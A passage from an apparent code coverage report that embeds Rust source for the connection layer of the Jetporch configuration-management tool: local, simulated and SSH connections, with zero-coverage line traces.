crate::connection::connection::Connection;\nuse crate::playbooks::context::PlaybookContext;\nuse crate::inventory::hosts::Host;\nuse std::sync::Arc;\nuse std::sync::Mutex;\nuse std::sync::RwLock;\nuse std::marker::{Send,Sync};\n\n// the factory trait that serves as the base for SshFactory, LocalFactory, and NoFactory\n\npub trait ConnectionFactory : Send + Sync {\n\n    fn get_connection(\u0026self, context: \u0026Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e, host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e) -\u003e Result\u003cArc\u003cMutex\u003cdyn Connection\u003e\u003e, String\u003e;\n\n    fn get_local_connection(\u0026self, context: \u0026Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e) -\u003e Result\u003cArc\u003cMutex\u003cdyn Connection\u003e\u003e, String\u003e;\n\n}\n","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","src","connection","local.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n//\n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n//\n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::connection::connection::Connection;\nuse crate::connection::command::CommandResult;\nuse crate::playbooks::context::PlaybookContext;\nuse crate::connection::factory::ConnectionFactory;\nuse crate::connection::command::Forward;\n\nuse crate::inventory::hosts::Host;\nuse crate::handle::response::Response;\nuse crate::tasks::{TaskRequest,TaskResponse};\n\nuse std::sync::Arc;\nuse std::sync::Mutex;\nuse std::sync::RwLock;\nuse std::process::Command;\nuse crate::Inventory;\nuse crate::util::io::jet_file_open;\nuse std::fs::File;\nuse std::path::Path;\nuse std::io::Write;\nuse std::env;\n\n// implementation for both the local connection factory and local connections\n\n#[allow(dead_code)]\npub struct LocalFactory {\n    local_connection: Arc\u003cMutex\u003cdyn Connection\u003e\u003e,\n    inventory: Arc\u003cRwLock\u003cInventory\u003e\u003e\n}\n\nimpl LocalFactory {\n    pub fn new(inventory: \u0026Arc\u003cRwLock\u003cInventory\u003e\u003e) -\u003e Self {\n\n        // we require a localhost to be in the inventory and immediately construct a connection to it\n\n        let host = inventory.read().expect(\"inventory read\").get_host(\u0026String::from(\"localhost\"));\n        let mut lc = LocalConnection::new(\u0026Arc::clone(\u0026host));\n        lc.connect().expect(\"connection ok\");\n        Self {\n            inventory: Arc::clone(\u0026inventory),\n            local_connection: Arc::new(Mutex::new(lc))\n        }\n    }\n}\nimpl ConnectionFactory for LocalFactory {\n    fn get_connection(\u0026self, _context: \u0026Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e, _host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e) -\u003e Result\u003cArc\u003cMutex\u003cdyn Connection\u003e\u003e,String\u003e {\n        // rather than producing new connections, this always returns a clone of the already established local connection from the constructor\n        let conn : Arc\u003cMutex\u003cdyn Connection\u003e\u003e = Arc::clone(\u0026self.local_connection);\n        return Ok(conn);\n    }\n    fn get_local_connection(\u0026self, _context: \u0026Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e) -\u003e Result\u003cArc\u003cMutex\u003cdyn Connection\u003e\u003e, String\u003e {\n        let conn : Arc\u003cMutex\u003cdyn Connection\u003e\u003e = Arc::clone(\u0026self.local_connection);\n        return Ok(conn);\n    }\n\n}\n\npub struct LocalConnection {\n    host: Arc\u003cRwLock\u003cHost\u003e\u003e,\n}\n\nimpl LocalConnection {\n    pub fn new(host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e) -\u003e Self {\n        Self { host: Arc::clone(\u0026host) }\n    }\n\n    fn trim_newlines(\u0026self, s: \u0026mut String) {\n        if s.ends_with('\\n') {\n            s.pop();\n            if s.ends_with('\\r') {\n                s.pop();\n            }\n        }\n    }\n}\n\nimpl Connection for LocalConnection {\n\n    fn whoami(\u0026self) -\u003e Result\u003cString,String\u003e {\n        // get the currently logged in user.\n        let user_result = env::var(\"USER\");\n        return match user_result {\n            Ok(x) =\u003e Ok(x),\n            Err(y) =\u003e Err(format!(\"environment variable $USER: {y}\"))\n        };\n    }\n\n    fn connect(\u0026mut self) -\u003e Result\u003c(),String\u003e {\n        // upon connection make sure the localhost detection routine runs\n        let result = detect_os(\u0026self.host);\n        if result.is_ok() {\n            return Ok(());\n        }\n        else {\n            let (_rc, out) = result.unwrap_err();\n            return Err(out);\n        }\n    }\n\n    fn run_command(\u0026self, response: \u0026Arc\u003cResponse\u003e, request: \u0026Arc\u003cTaskRequest\u003e, cmd: \u0026String, _forward: Forward) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let mut base = Command::new(\"sh\");\n        let cmd2 = format!(\"LANG=C {}\", cmd);\n        let command = base.arg(\"-c\").arg(cmd2).arg(\"2\u003e\u00261\");\n        match command.output() {\n            Ok(x) =\u003e {\n                match x.status.code() {\n                    Some(rc) =\u003e {\n                        let mut out = convert_out(\u0026x.stdout,\u0026x.stderr);\n                        self.trim_newlines(\u0026mut out);\n                        return Ok(response.command_ok(request,\u0026Arc::new(Some(CommandResult { cmd: cmd.clone(), out: out.clone(), rc: rc }))));\n                    },\n                    None =\u003e {\n                        return Err(response.command_failed(request, \u0026Arc::new(Some(CommandResult { cmd: cmd.clone(), out: String::from(\"\"), rc: 418 }))));\n                    }\n                }\n            },\n            Err(_x) =\u003e {\n                return Err(response.command_failed(request, \u0026Arc::new(Some(CommandResult { cmd: cmd.clone(), out: String::from(\"\"), rc: 404 }))));\n            }\n        };\n    }\n\n    fn copy_file(\u0026self, response: \u0026Arc\u003cResponse\u003e, request: \u0026Arc\u003cTaskRequest\u003e, src: \u0026Path, remote_path: \u0026String) -\u003e Result\u003c(), Arc\u003cTaskResponse\u003e\u003e {\n        // FIXME: this (temporary) implementation currently loads the file contents into memory which we do not want\n        // copy the files with system calls instead.\n        let remote_path2 = Path::new(remote_path);\n        let result = std::fs::copy(src, \u0026remote_path2);\n        return match result {\n            Ok(_x) =\u003e Ok(()),\n            Err(e) =\u003e { return Err(response.is_failed(\u0026request, \u0026format!(\"copy failed: {:?}\", e))) }\n        }\n    }\n\n    fn write_data(\u0026self, response: \u0026Arc\u003cResponse\u003e, request: \u0026Arc\u003cTaskRequest\u003e, data: \u0026String, remote_path: \u0026String) -\u003e Result\u003c(),Arc\u003cTaskResponse\u003e\u003e {\n        let path = Path::new(\u0026remote_path);\n        if path.exists() {\n            let mut file = match jet_file_open(path) {\n                Ok(x) =\u003e x,\n                Err(y) =\u003e return Err(response.is_failed(\u0026request, \u0026format!(\"failed to open: {}: {:?}\", remote_path, y)))\n            };\n            let write_result = write!(file, \"{}\", data);\n            match write_result {\n                Ok(_) =\u003e {},\n                Err(y) =\u003e return Err(response.is_failed(\u0026request, \u0026format!(\"failed to write: {}: {:?}\", remote_path, y)))\n            };\n        } else {\n            let mut file = match File::create(\u0026path) {\n                Ok(x) =\u003e x,\n                Err(y) =\u003e return Err(response.is_failed(\u0026request, \u0026format!(\"failed to create: {}: {:?}\", remote_path, y)))\n            };\n            let write_result = write!(file, \"{}\", data);\n            match write_result {\n                Ok(_) =\u003e {},\n                Err(y) =\u003e return Err(response.is_failed(\u0026request, \u0026format!(\"failed to write: {}: {:?}\", remote_path, y)))\n            };\n        }\n        return Ok(());\n    }\n\n}\n\npub fn convert_out(output: \u0026Vec\u003cu8\u003e, err: \u0026Vec\u003cu8\u003e) -\u003e String {\n    // output from the Rust command class can contain junk bytes, here we mostly don't try to solve this yet\n    // and will basically fail if output contains junk. This may be dealt with later.\n    let mut base = match std::str::from_utf8(output) {\n        Ok(val) =\u003e val.to_string(),\n        Err(_) =\u003e String::from(\"invalid UTF-8 characters in response\"),\n    };\n    let rest = match std::str::from_utf8(err) {\n        Ok(val) =\u003e val.to_string(),\n        Err(_) =\u003e String::from(\"invalid UTF-8 characters in response\"),\n    };\n    base.push_str(\"\\n\");\n    base.push_str(\u0026rest);\n    return base.trim().to_string();\n}\n\nfn detect_os(host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e) -\u003e Result\u003c(),(i32, String)\u003e {\n    // upon connection we run uname -a on connect to check the OS type.\n    \n    let mut base = Command::new(\"uname\");\n    let command = base.arg(\"-a\");\n    return match command.output() {\n        Ok(x) =\u003e match x.status.code() {\n            Some(0)      =\u003e {\n                let out = convert_out(\u0026x.stdout,\u0026x.stderr);\n                {\n                    match host.write().unwrap().set_os_info(\u0026out) {\n                        Ok(_) =\u003e { },\n                        Err(_) =\u003e { return Err((500, String::from(\"failed to set OS info\"))); }\n                    }\n                }\n                Ok(())\n            }\n            Some(status) =\u003e Err((status, convert_out(\u0026x.stdout, \u0026x.stderr))),\n            _            =\u003e Err((418, String::from(\"uname -a failed without status code\")))\n        },\n        Err(_x) =\u003e Err((418, String::from(\"uname -a failed without status code\")))\n    }\n}\n","traces":[{"line":47,"address":[],"length":0,"stats":{"Line":0}},{"line":51,"address":[],"length":0,"stats":{"Line":0}},{"line":52,"address":[],"length":0,"stats":{"Line":0}},{"line":53,"address":[],"length":0,"stats":{"Line":0}},{"line":55,"address":[],"length":0,"stats":{"Line":0}},{"line":56,"address":[],"length":0,"stats":{"Line":0}},{"line":61,"address":[],"length":0,"stats":{"Line":0}},{"line":63,"address":[],"length":0,"stats":{"Line":0}},{"line":64,"address":[],"length":0,"stats":{"Line":0}},{"line":66,"address":[],"length":0,"stats":{"Line":0}},{"line":67,"address":[],"length":0,"stats":{"Line":0}},{"line":68,"address":[],"length":0,"stats":{"Line":0}},{"line":78,"address":[],"length":0,"stats":{"Line":0}},{"line":79,"address":[],"length":0,"stats":{"Line":0}},{"line":82,"address":[],"length":0,"stats":{"Line":0}},{"line":83,"address":[],"length":0,"stats":{"Line":0}},{"line":84,"address":[],"length":0,"stats":{"Line":0}},{"line":85,"address":[],"length":0,"stats":{"Line":0}},{"line":86,"address":[],"length":0,"stats":{"Line":0}},{"line":94,"address":[],"length":0,"stats":{"Line":0}},{"line":96,"address":[],"length":0,"stats":{"Line":0}},{"line":97,"address":[],"length":0,"stats":{"Line":0}},{"line":98,"address":[],"length":0,"stats":{"Line":0}},{"line":99,"address":[],"length":0,"stats":{"Line":0}},{"line":103,"address":[],"length":0,"stats":{"Line":0}},{"line":105,"address":[],"length":0,"stats":{"Line":0}},{"line":106,"address":[],"length":0,"stats":{"Line":0}},{"line":107,"address":[],"length":0,"stats":{"Line":0}},{"line":110,"address":[],"length":0,"stats":{"Line":0}},{"line":111,"address":[],"length":0,"stats":{"Line":0}},{"line":115,"address":[],"length":0,"stats":{"Line":0}},{"line":116,"address":[],"length":0,"stats":{"Line":0}},{"line":117,"address":[],"length":0,"stats":{"Line":0}},{"line":118,"address":[],"length":0,"stats":{"Line":0}},{"line":119,"address":[],"length":0,"stats":{"Line":0}},{"line":120,"address":[],"length":0,"stats":{"Line":0}},{"line":121,"address":[],"length":0,"stats":{"Line":0}},{"line":122,"address":[],"length":0,"stats":{"Line":0}},{"line":123,"address":[],"length":0,"stats":{"Line":0}},{"line":124,"address":[],"length":0,"stats":{"Line":0}},{"line":125,"address":[],"length":0,"stats":{"Line":0}},{"line":128,"address":[],"length":0,"stats":{"Line":0}},{"line":132,"address":[],"length":0,"stats":{"Line":0}},{"line":133,"address":[],"length":0,"stats":{"Line":0}},{"line":138,"address":[],"length":0,"stats":{"Line":0}},{"line":141,"address":[],"length":0,"stats":{"Line":0}},{"line":142,"address":[],"length":0,"stats":{"Line":0}},{"line":143,"address":[],"length":0,"stats":{"Line":0}},{"line":144,"address":[],"length":0,"stats":{"Line":0}},{"line":145,"address":[],"length":0,"stats":{"Line":0}},{"line":149,"address":[],"length":0,"stats":{"Line":0}},{"line":150,"address":[],"length":0,"stats":{"Line":0}},{"line":151,"address":[],"length":0,"stats":{"Line":0}},{"line":152,"address":[],"length":0,"stats":{"Line":0}},{"line":153,"address":[],"length":0,"stats":{"Line":0}},{"line":154,"address":[],"length":0,"stats":{"Line":0}},{"line":156,"address":[],"length":0,"stats":{"Line":0}},{"line":157,"address":[],"length":0,"stats":{"Line":0}},{"line":158,"address":[],"length":0,"stats":{"Line":0}},{"line":159,"address":[],"length":0,"stats":{"Line":0}},{"line":162,"address":[],"length":0,"stats":{"Line":0}},{"line":163,"address":[],"length":0,"stats":{"Line":0}},{"line":164,"address":[],"length":0,"stats":{"Line":0}},{"line":166,"address":[],"length":0,"stats":{"Line":0}},{"line":167,"address":[],"length":0,"stats":{"Line":0}},{"line":168,"address":[],"length":0,"stats":{"Line":0}},{"line":169,"address":[],"length":0,"stats":{"Line":0}},{"line":172,"address":[],"length":0,"stats":{"Line":0}},{"line":177,"address":[],"length":0,"stats":{"Line":0}},{"line":180,"address":[],"length":0,"stats":{"Line":0}},{"line":181,"address":[],"length":0,"stats":{"Line":0}},{"line":182,"address":[],"length":0,"stats":{"Line":0}},{"line":184,"address":[],"length":0,"stats":{"Line":0}},{"line":185,"address":[],"length":0,"stats":{"Line":0}},{"line":186,"address":[],"length":0,"stats":{"Line":0}},{"line":188,"address":[],"length":0,"stats":{"Line":0}},{"line":189,"address":[],"length":0,"stats":{"Line":0}},{"line":190,"address":[],"length":0,"stats":{"Line":0}},{"line":193,"address":[],"length":0,"stats":{"Line":0}},{"line":196,"address":[],"length":0,"stats":{"Line":0}},{"line":197,"address":[],"length":0,"stats":{"Line":0}},{"line":198,"address":[],"length":0,"stats":{"Line":0}},{"line":199,"address":[],"length":0,"stats":{"Line":0}},{"line":201,"address":[],"length":0,"stats":{"Line":0}},{"line":203,"address":[],"length":0,"stats":{"Line":0}},{"line":204,"address":[],"length":0,"stats":{"Line":0}},{"line":205,"address":[],"length":0,"stats":{"Line":0}},{"line":208,"address":[],"length":0,"stats":{"Line":0}},{"line":210,"address":[],"length":0,"stats":{"Line":0}},{"line":211,"address":[],"length":0,"stats":{"Line":0}},{"line":213,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":91},{"path":["/","Users","wings","projects","jetpack","src","connection","mod.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\npub mod connection;\npub mod factory;\npub mod ssh;\npub mod local;\npub mod no;\npub mod command;\npub mod cache;","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","src","connection","no.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::connection::connection::{Connection};\nuse crate::connection::factory::ConnectionFactory;\nuse crate::playbooks::context::PlaybookContext;\nuse crate::inventory::hosts::{Host,HostOSType};\nuse crate::tasks::request::TaskRequest;\nuse crate::tasks::response::TaskResponse;\nuse crate::handle::response::Response;\nuse crate::connection::command::CommandResult;\nuse crate::connection::command::Forward;\nuse std::sync::Arc;\nuse std::sync::Mutex;\nuse std::sync::RwLock;\nuse std::path::Path;\n\n// the noconnection and nofactory are not really used in normal execution of jet, but are around in the \"__simulate\" hidden\n// suboption, as this is occasionally useful for testing certain jet internals.  This is not meant for serious work.\n\npub struct NoFactory {}\n\nimpl NoFactory { \n    pub fn new() -\u003e Self {\n        Self {}\n    }\n}\n\nimpl ConnectionFactory for NoFactory {\n    fn get_connection(\u0026self, _context: \u0026Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e, host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e) -\u003e Result\u003cArc\u003cMutex\u003cdyn Connection\u003e\u003e,String\u003e {\n        // we just pretend everything is Linux for now\n        host.write().unwrap().os_type = Some(HostOSType::Linux);\n        let conn : Arc\u003cMutex\u003cdyn Connection\u003e\u003e = Arc::new(Mutex::new(NoConnection::new()));\n        return Ok(conn);\n    }\n    fn get_local_connection(\u0026self, _context: \u0026Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e) -\u003e Result\u003cArc\u003cMutex\u003cdyn Connection\u003e\u003e, String\u003e {\n        let conn : Arc\u003cMutex\u003cdyn Connection\u003e\u003e = Arc::new(Mutex::new(NoConnection::new()));\n        return Ok(conn);\n    }\n}\n\npub struct NoConnection {\n}\n\nimpl NoConnection {\n    pub fn new() -\u003e Self {\n        Self { \n        }\n    }\n}\n\nimpl Connection for NoConnection {\n\n   fn whoami(\u0026self) -\u003e Result\u003cString,String\u003e {\n       // we don't really bother with saying what username is connected\n       return Ok(String::from(\"root\"));\n   }\n\n   fn connect(\u0026mut self) -\u003e Result\u003c(),String\u003e {\n       // all connections are imaginary so there's nothing to do\n       return Ok(());\n   }\n\n   fn run_command(\u0026self, response: \u0026Arc\u003cResponse\u003e, request: \u0026Arc\u003cTaskRequest\u003e, cmd: \u0026String, _forward: Forward) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n       // all commands return junk output pretending they were successful\n       return Ok(response.command_ok(request,\u0026Arc::new(Some(CommandResult { cmd: cmd.clone(), out: String::from(\"__simulated__\"), rc: 0 }))));\n   }\n\n   fn write_data(\u0026self, _response: \u0026Arc\u003cResponse\u003e, _request: \u0026Arc\u003cTaskRequest\u003e, _data: \u0026String, _remote_path: \u0026String) -\u003e Result\u003c(),Arc\u003cTaskResponse\u003e\u003e{\n       // no data is transferred, we just pretend things were successful\n       return Ok(());\n   }\n\n   fn copy_file(\u0026self, _response: \u0026Arc\u003cResponse\u003e, _request: \u0026Arc\u003cTaskRequest\u003e, _src: \u0026Path, _dest: \u0026String) -\u003e Result\u003c(), Arc\u003cTaskResponse\u003e\u003e {\n       // no data is transferred, as per above\n       return Ok(());\n   }\n\n}","traces":[{"line":37,"address":[],"length":0,"stats":{"Line":0}},{"line":43,"address":[],"length":0,"stats":{"Line":0}},{"line":45,"address":[],"length":0,"stats":{"Line":0}},{"line":46,"address":[],"length":0,"stats":{"Line":0}},{"line":47,"address":[],"length":0,"stats":{"Line":0}},{"line":49,"address":[],"length":0,"stats":{"Line":0}},{"line":50,"address":[],"length":0,"stats":{"Line":0}},{"line":51,"address":[],"length":0,"stats":{"Line":0}},{"line":59,"address":[],"length":0,"stats":{"Line":0}},{"line":67,"address":[],"length":0,"stats":{"Line":0}},{"line":69,"address":[],"length":0,"stats":{"Line":0}},{"line":72,"address":[],"length":0,"stats":{"Line":0}},{"line":74,"address":[],"length":0,"stats":{"Line":0}},{"line":77,"address":[],"length":0,"stats":{"Line":0}},{"line":79,"address":[],"length":0,"stats":{"Line":0}},{"line":82,"address":[],"length":0,"stats":{"Line":0}},{"line":84,"address":[],"length":0,"stats":{"Line":0}},{"line":87,"address":[],"length":0,"stats":{"Line":0}},{"line":89,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":19},{"path":["/","Users","wings","projects","jetpack","src","connection","ssh.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::connection::connection::Connection;\nuse crate::connection::command::CommandResult;\nuse crate::connection::factory::ConnectionFactory;\nuse crate::playbooks::context::PlaybookContext;\nuse crate::connection::local::LocalFactory;\nuse crate::tasks::*;\nuse crate::inventory::hosts::Host;\nuse crate::Inventory;\nuse crate::handle::response::Response;\nuse crate::connection::command::Forward;\nuse crate::connection::local::convert_out;\nuse std::process::Command;\nuse std::sync::{Arc,Mutex,RwLock};\nuse ssh2::Session;\nuse std::io::{Read,Write};\nuse std::net::TcpStream;\nuse std::path::Path;\nuse std::time::Duration;\nuse std::net::ToSocketAddrs;\nuse std::fs::File;\n//use std::io;\nuse std::io;\n\n// implementation for both Ssh Connections and the Ssh Connection factory\n\npub struct SshFactory {\n    local_factory: LocalFactory,\n    localhost: Arc\u003cRwLock\u003cHost\u003e\u003e,\n    forward_agent: bool,\n    login_password: Option\u003cString\u003e\n}\n\nimpl SshFactory { \n    pub fn new(inventory: \u0026Arc\u003cRwLock\u003cInventory\u003e\u003e, forward_agent: bool, login_password: Option\u003cString\u003e) -\u003e Self { \n        // we create a local connection factory for localhost rather than establishing local connections with SSH\n        Self {\n            localhost : inventory.read().expect(\"inventory read\").get_host(\u0026String::from(\"localhost\")),\n            local_factory: LocalFactory::new(inventory),\n            forward_agent,\n            login_password\n        } \n    }\n}\n\nimpl ConnectionFactory for SshFactory {\n\n    fn get_local_connection(\u0026self, context: \u0026Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e) -\u003e Result\u003cArc\u003cMutex\u003cdyn Connection\u003e\u003e, String\u003e {\n        return Ok(self.local_factory.get_connection(context, \u0026self.localhost)?);\n    }\n\n    fn get_connection(\u0026self, context: \u0026Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e, host:\u0026Arc\u003cRwLock\u003cHost\u003e\u003e) -\u003e Result\u003cArc\u003cMutex\u003cdyn Connection\u003e\u003e, String\u003e {\n        let ctx = context.read().expect(\"context read\");\n        let hostname1 = host.read().expect(\"host read\").name.clone();\n        if hostname1.eq(\"localhost\") {\n            // if we are asked for a connection to localhost because it's in a group, we'll be called here\n            // instead of from get_local_connecton, so have to return the local connection versus assuming SSH\n            let conn : Arc\u003cMutex\u003cdyn Connection\u003e\u003e = self.local_factory.get_connection(context, \u0026self.localhost)?;\n            return Ok(conn);\n        } \n\n        {\n            // SSH connections are kept open between tasks generally but cleared at many strategic points during playbook traversal\n            // between plays, in between batches, etc.\n            let cache = ctx.connection_cache.read().unwrap();\n            if cache.has_connection(host) {\n                let conn = cache.get_connection(host);\n                return Ok(conn);\n            }\n        }\n\n        // how we connect to a host depends on some settings of the play (ssh_port, ssh_user), the CLI (--user) and\n        // possibly magic variables on the host.  The context contains all of this logic.\n        let (hostname2, user, port, key, passphrase, key_comment) = ctx.get_ssh_connection_details(host);\n        if hostname2.eq(\"localhost\") { \n            // jet_ssh_hostname was set to localhost, which doesn't make a lot of sense but could happen in testing\n            // contrived playbooks when we don't want a lot of real remote hosts\n            let conn : Arc\u003cMutex\u003cdyn Connection\u003e\u003e = self.local_factory.get_connection(context, \u0026self.localhost)?;\n            return Ok(conn); \n        }\n\n        // actually connect here\n        let mut conn = SshConnection::new(Arc::clone(\u0026host), \u0026user, port, hostname2, self.forward_agent, self.login_password.clone(), key, passphrase, key_comment);\n        return match conn.connect() {\n            Ok(_)  =\u003e { \n                let conn2 : Arc\u003cMutex\u003cdyn Connection\u003e\u003e = Arc::new(Mutex::new(conn));\n                ctx.connection_cache.write().expect(\"connection cache write\").add_connection(\n                    \u0026Arc::clone(\u0026host), \u0026Arc::clone(\u0026conn2));\n                Ok(conn2)\n            },\n            Err(x) =\u003e { Err(x) } \n        }\n    }\n}\n \npub struct SshConnection {\n    pub host: Arc\u003cRwLock\u003cHost\u003e\u003e,\n    pub username: String,\n    pub port: i64,\n    pub hostname: String, \n    pub session: Option\u003cSession\u003e,\n    pub forward_agent: bool,\n    pub login_password: Option\u003cString\u003e,\n    pub key: Option\u003cString\u003e,\n    pub passphrase: Option\u003cString\u003e,\n    pub key_comment: Option\u003cString\u003e,\n}\n\nimpl SshConnection {\n    pub fn new(host: Arc\u003cRwLock\u003cHost\u003e\u003e, username: \u0026String, port: i64, hostname: String, forward_agent: bool, login_password: Option\u003cString\u003e, key: Option\u003cString\u003e, passphrase: Option\u003cString\u003e, key_comment: Option\u003cString\u003e) -\u003e Self {\n        Self { host: Arc::clone(\u0026host), username: username.clone(), port, hostname, session: None, forward_agent, login_password, key, passphrase, key_comment }\n    }\n}\n\nimpl Connection for SshConnection {\n\n    fn whoami(\u0026self) -\u003e Result\u003cString,String\u003e {\n        // if asked who we are logged in as, it is the user we have connected with\n        // sudoers info is on top of that, and this logic is expressed in remote.rs\n        return Ok(self.username.clone());\n    }\n\n    fn connect(\u0026mut self) -\u003e Result\u003c(), String\u003e {\n\n        if self.session.is_some() {\n            // don't re-connect if we are already connected (the code might not try this anyway?)\n            return Ok(());\n        }\n\n        // derived from docs at https://docs.rs/ssh2/latest/ssh2/\n        let session = match Session::new() { Ok(x) =\u003e x, Err(_y) =\u003e { return Err(String::from(\"failed to attach to session\")); } };\n        match session.agent() { \n            Ok(mut agent) =\u003e {\n                match agent.connect() { \n                    Ok(_) =\u003e {}, //x, \n                    Err(_)  =\u003e { \n                        println!(\"Ok, no agent\");\n                        //return Err(String::from(\"failed to connect to SSH-agent\")) \n                    }\n                }\n            }, \n            Err(_) =\u003e { \n                println!(\"Ok, no agent 2\");\n                //return Err(String::from(\"failed to acquire SSH-agent\")); } \n            }\n        };\n\n        // Connect the agent\n       \n        // currently we don't do anything with listing the identities in SSH agent.  It might be helpful to provide a nice error\n        // if none were detected\n\n        // Connect to the local SSH server - need to get socketaddrs first in order to use Duration for timeout\n        let seconds = Duration::from_secs(10);\n        assert!(!self.host.read().expect(\"host read\").name.eq(\"localhost\"));\n        let connect_str = format!(\"{host}:{port}\", host=self.hostname, port=self.port.to_string());\n        // connect with timeout requires SocketAddr objects instead of just connection strings\n        let addrs_iter = connect_str.as_str().to_socket_addrs();\n        \n        // check for errors\n        let mut addrs_iter2 = match addrs_iter { Err(_x) =\u003e { return Err(String::from(\"unable to resolve\")); }, Ok(y) =\u003e y };\n        let addr = addrs_iter2.next();\n        if ! addr.is_some() { return Err(String::from(\"unable to resolve(2)\"));  }\n        \n        // actually connect (finally) here\n        let tcp = match TcpStream::connect_timeout(\u0026addr.unwrap(), seconds) { Ok(x) =\u003e x, _ =\u003e { \n            return Err(format!(\"SSH connection attempt failed for {}:{}\", self.hostname, self.port)); } };\n        \n        // new session \u0026 handshake\n        let mut sess = match Session::new() { Ok(x) =\u003e x, _ =\u003e { return Err(String::from(\"SSH session failed\")); } };\n        sess.set_tcp_stream(tcp);\n        match sess.handshake() { Ok(_) =\u003e {}, _ =\u003e { return Err(String::from(\"SSH handshake failed\")); } } ;\n        \n        if self.login_password.is_some() {\n            match sess.userauth_password(\u0026self.username.clone(), self.login_password.clone().unwrap().as_str()) {\n                Ok(_) =\u003e {},\n                Err(x) =\u003e {\n                    return Err(format!(\"SSH password authentication failed for user {}: {}\", self.username, x));\n                }\n            }\n        }\n\n        if self.key.is_some() {\n            // a specific key was specified, \n            let k2 = self.key.as_ref().unwrap().clone();\n            let keypath = Path::new(\u0026k2);\n            if ! keypath.exists() {\n                return Err(format!(\"cannot find designed keyfile {}\", k2));\n            }\n            match sess.userauth_pubkey_file(\u0026self.username.clone(), None, keypath, self.passphrase.as_deref()) {\n                Ok(_) =\u003e {},\n                Err(x) =\u003e {\n                    return Err(format!(\"SSH key authentication failed for user {} with key {:?}: {}\", self.username, keypath, x));\n                }\n            };\n        }\n        \n        if self.key.is_none() \u0026\u0026 self.login_password.is_none() {\n            if self.key_comment.is_some() {\n                // use this specific SSH key\n                let mut agent = sess.agent().unwrap();\n                match agent.connect() {\n                    Ok(_) =\u003e {},\n                    Err(x) =\u003e {\n                        return Err(format!(\"SSH cannot connect to agent: {}\", x));\n                    }\n                };\n                // list_identities is needed to populate the identities in memory,\n                // see: https://docs.rs/ssh2/latest/ssh2/struct.Agent.html#method.list_identities\n                match agent.list_identities() {\n                    Ok(_) =\u003e {},\n                    Err(x) =\u003e {\n                        return Err(format!(\"SSH list_identities returned an error, please check whether agent is running: {}\", x));\n                    }\n                };\n                let mut found : bool = false;\n                for ident in agent.identities().unwrap() {\n                    match ident.comment() == self.key_comment.clone().unwrap() {\n                        true =\u003e {\n                            match agent.userauth(\u0026self.username, \u0026ident) {\n                                Ok(_) =\u003e {\n                                    // use this identity\n                                    found = true;\n                                    break;\n                                },\n                                Err(x) =\u003e { \n                                    return Err(format!(\"SSH Key authentication failed for user {} with key {}: {}\", \n                                        self.username, self.key_comment.clone().unwrap(), x)); \n                                }\n                            };\n                        }\n                        false =\u003e (),\n                    }\n                }\n                if !found {\n                    return Err(format!(\"specified SSH key not found with comment {}\", self.key_comment.clone().unwrap()));\n                }\n            } else {\n                // no key comment specified, do not use a specific key\n                match sess.userauth_agent(\u0026self.username) { \n                    Ok(_) =\u003e {}, \n                    Err(x) =\u003e { \n                     